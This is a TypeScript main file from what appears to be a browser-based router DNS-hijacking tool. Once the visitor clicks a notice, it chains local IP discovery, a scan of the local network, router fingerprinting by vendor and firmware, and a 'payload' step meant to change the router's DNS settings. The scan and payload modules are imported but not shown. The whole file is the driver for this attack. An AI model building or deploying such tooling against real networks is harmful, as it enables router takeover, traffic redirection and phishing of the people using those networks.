import {Promise} from "es6-promise";
import IPAddress from "./shared/IPAddress";
import FingerprintResult from "./fingerprint/FingerprintResult";
import doDiscoverDevices from "./discover_devices/index";
import doFingerprint from "./fingerprint/index";
import doPayload from "./payload/index";
import doLocalIp from "./local_ip/index";

function waitForDOMContentLoaded():Promise<any> {
    if (document.readyState === 'complete') {
        return Promise.resolve();
    } else {
        return new Promise((resolve) => {
            document.addEventListener("DOMContentLoaded", resolve)
        });
    }
}

/**
 * Prompts the user before starting the hijacking, as we
 * are doing things that might flag the user if he/she is
 * on an enterprise network.
 */
function getUserApproval():Promise<any> {
    return new Promise((resolve) => {
        let infoText = document.createElement('p');
        infoText.innerHTML = ""
            + "<b>NOTICE:</b>"
            + "<br />"
            + "This site will attempt to change the DNS settings of your router."
            + "<br />"
            + " In attempting to doing so, this site will make your browser do,"
            + " among other things, a network scan. This might flag your ip if you"
            + " are on an enterprise network."
            + "<br />"
            + " Click 'OK' below only if you understand the consequences. Otherwise"
            + " close this page.";

        let buttonOk = document.createElement('button');
        buttonOk.innerHTML = 'OK';
        buttonOk.onclick = () => {
            infoText.style.display = 'none';
            buttonOk.style.display = 'none';
            resolve();
        };

        document.body.appendChild(infoText);
        document.body.appendChild(buttonOk);
    });
}

function printLocalIp(ips:IPAddress[]):IPAddress[] {
    console.group('Local Ip Results');
    ips.forEach((ip) => {
        console.info(ip.toString())
    });
    console.groupEnd();
    return ips;
}

function printDiscoveredDevices(ips:IPAddress[]):IPAddress[] {
    console.group('Discover Results');
    ips.forEach((ip) => {
        console.info(ip.toString())
    });
    console.groupEnd();
    return ips;
}

function printFingerprintedDevices(fingerprints:FingerprintResult[]):FingerprintResult[] {
    console.group('Fingerprint Results');
    fingerprints.forEach((fp) => {
        console.info(`${fp.ip} -> ${fp.vendor}:${fp.hwVersion}:${fp.fwVersion}`)
    });
    console.groupEnd();
    return fingerprints;
}

(function main() {
    waitForDOMContentLoaded()
        .then(() => getUserApproval())
        .then(() => console.time("execTime"))
        .then(doLocalIp)
        .then(printLocalIp)
        .then(doDiscoverDevices)
        .then(printDiscoveredDevices)
        .then(doFingerprint)
        .then(printFingerprintedDevices)
        .then(doPayload)
        .then(() => console.timeEnd("execTime"))
        .catch((err) => {
            console.error("Error caught in main!");
            console.error(err);
        })
})();
